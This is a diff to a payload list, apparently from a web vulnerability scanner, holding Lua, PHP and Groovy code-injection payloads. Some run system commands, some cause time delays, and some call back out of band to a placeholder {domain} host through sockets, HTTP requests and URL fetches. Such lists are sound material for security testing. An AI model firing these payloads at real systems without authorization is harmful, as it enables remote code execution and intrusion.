@@ -97,8 +97,7 @@ require('socket').sleep(5)
 require("socket").connect("{domain}", 80)
 require("socket.http").request("http://{domain}/lua")
 ##PHP Code Injection##
-assert(system('echo 1337'))
-preg_replace('/.*/e','system("echo 1337")','')
+system('expr 7 \\* 191')
 create_function('','return 7*191;')()
 assert(sleep(5)||1)
 assert(file_get_contents('http://{domain}/php'))
@@ -123,7 +122,7 @@ new GroovyShell().evaluate('Thread.sleep(5000)')
 
 ##Groovy Code Injection - OOB##
 new URL('http://{domain}/groovy').text
-['curl','http://{domain}/groovy'].execute()
+new java.net.URL('http://{domain}/groovy2').openStream()
 "http://{domain}/groovy".toURL().text
 
 ##Groovy Code Injection - Error##
